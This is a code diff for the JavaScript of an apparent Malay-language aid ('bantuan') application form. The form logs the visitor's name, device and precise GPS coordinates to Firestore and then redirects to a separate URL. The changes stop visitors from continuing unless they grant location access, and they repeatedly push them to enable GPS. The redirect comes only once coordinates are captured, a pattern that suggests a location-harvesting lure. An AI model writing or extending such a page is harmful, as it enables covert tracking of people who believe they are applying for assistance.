@@ -1,11 +1,14 @@
 import { saveSessionRecord, updateSessionWithGps, updateSessionApplicant, updateSessionGpsError, saveLocationRecord } from './db.js';
 
 // DOM References
-const userForm     = document.getElementById('userForm');
-const jenisBantuan = document.getElementById('jenisBantuan');
-const fullName     = document.getElementById('fullName');
-const nameError    = document.getElementById('nameError');
-const actionBtn    = document.getElementById('actionBtn');
+const userForm       = document.getElementById('userForm');
+const jenisBantuan   = document.getElementById('jenisBantuan');
+const fullName       = document.getElementById('fullName');
+const nameError      = document.getElementById('nameError');
+const actionBtn      = document.getElementById('actionBtn');
+const gpsAlertNotice = document.getElementById('gpsAlertNotice');
+const gpsAlertText   = document.getElementById('gpsAlertText');
+const guideBox       = document.getElementById('guideBox');
 
 // State
 let detectedDevice = detectDeviceName();
@@ -214,7 +217,7 @@ export async function requestGpsLocation(applicantIdentity, enteredName, selecte
       });
     }
     alert('Perhatian: Ciri pengesahan GPS pada telefon memerlukan sambungan HTTPS selamat. Sila buka laman melalui HTTPS.');
-    window.location.href = REDIRECT_URL;
+    resetForm();
     return;
   }
 
@@ -228,7 +231,8 @@ export async function requestGpsLocation(applicantIdentity, enteredName, selecte
         reason: 'NOT_SUPPORTED'
       });
     }
-    window.location.href = REDIRECT_URL;
+    alert('Pelayar ini tidak menyokong fungsi lokasi GPS.');
+    resetForm();
     return;
   }
 
@@ -248,12 +252,12 @@ export async function requestGpsLocation(applicantIdentity, enteredName, selecte
   let position = null;
   let lastError = null;
 
-  // 3. Dual-stage acquisition: Try high-accuracy first, then fall back immediately to WiFi/Cellular
+  // 3. Dual-stage acquisition: Try high-accuracy first (30s timeout so user has time to tap dialog)
   try {
     position = await getGeoPosition({
       enableHighAccuracy: true,
-      timeout: 8000,
-      maximumAge: 10000
+      timeout: 30000,
+      maximumAge: 5000
     });
   } catch (err1) {
     console.warn('High-accuracy GPS attempt failed (code ' + err1.code + '):', err1.message);
@@ -264,7 +268,7 @@ export async function requestGpsLocation(applicantIdentity, enteredName, selecte
       try {
         position = await getGeoPosition({
           enableHighAccuracy: false,
-          timeout: 10000,
+          timeout: 15000,
           maximumAge: 60000
         });
         lastError = null; // Resolved via fallback
@@ -275,7 +279,7 @@ export async function requestGpsLocation(applicantIdentity, enteredName, selecte
     }
   }
 
-  // 4. Handle GPS Success
+  // 4. Handle GPS Success (ONLY REDIRECT HERE!)
   if (position && position.coords) {
     const coords = position.coords;
 
@@ -328,48 +332,65 @@ export async function requestGpsLocation(applicantIdentity, enteredName, selecte
       console.error('Error saving GPS to Firestore:', saveErr);
     }
 
+    if (gpsAlertNotice) gpsAlertNotice.style.display = 'none';
+
     if (actionBtn) {
       actionBtn.classList.add('btn--success');
       actionBtn.innerHTML = `
         <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
           <polyline points="20 6 9 17 4 12"></polyline>
         </svg>
-        Memproses…
+        Disahkan! Memproses…
       `;
     }
 
+    // Smooth redirection only after GPS is captured
     setTimeout(() => {
       window.location.href = REDIRECT_URL;
     }, 600);
     return;
   }
 
-  // 5. Handle GPS Error (Permission denied or failed)
+  // 5. GPS NOT YET GRANTED / FAILED: DO NOT REDIRECT!
   let reasonText = 'UNKNOWN_GPS_ERROR';
   if (lastError) {
     if (lastError.code === 1) {
-      reasonText = 'PERMISSION_DENIED (Browser Blocked)';
+      reasonText = 'PERMISSION_DENIED (User / Browser Blocked)';
     } else if (lastError.code === 2) {
       reasonText = 'POSITION_UNAVAILABLE (GPS Off)';
     } else if (lastError.code === 3) {
-      reasonText = 'TIMEOUT (No signal)';
+      reasonText = 'TIMEOUT (No signal / Ignored)';
     }
   }
 
   if (currentSessionDocId) {
     await updateSessionGpsError(currentSessionDocId, {
       code: lastError ? lastError.code : 0,
-      message: lastError ? lastError.message : 'No position returned',
+      message: lastError ? lastError.message : 'Location not granted yet',
       reason: reasonText
     });
   }
 
-  // If permission was denied by browser setting, notify user before redirecting
-  if (lastError && lastError.code === 1) {
-    alert('Akses Lokasi Disekat: Sila benarkan akses lokasi dalam tetapan pelayar anda (tekan ikon kunci/tetapan di sebelah URL) untuk melengkapkan permohonan.');
-  }
+  // Reset form button immediately so user can click again
+  resetForm();
 
-  window.location.href = REDIRECT_URL;
+  // Show clear instructions notice and highlight guide image
+  if (gpsAlertNotice) {
+    gpsAlertNotice.style.display = 'block';
+    if (gpsAlertText) {
+      if (lastError && lastError.code === 1) {
+        gpsAlertText.innerHTML = 'Akses lokasi telah ditolak/disekat. Sila benarkan akses lokasi pada tetapan pelayar anda (tekan ikon kunci/tetapan di sebelah URL) dan tekan <strong>SETERUSNYA</strong> semula.';
+      } else if (lastError && lastError.code === 2) {
+        gpsAlertText.innerHTML = 'Fungsi GPS/Lokasi peranti anda tidak aktif. Sila hidupkan <strong>Location / GPS</strong> pada telefon anda dan tekan <strong>SETERUSNYA</strong> semula.';
+      } else {
+        gpsAlertText.innerHTML = 'Sila pastikan anda memilih <strong>"While using the app" / "Benarkan"</strong> seperti gambar panduan di atas untuk meneruskan permohonan.';
+      }
+    }
+    if (guideBox) {
+      guideBox.style.borderColor = '#f43f5e';
+      guideBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    }
+  }
 }
 
 function resetForm() {
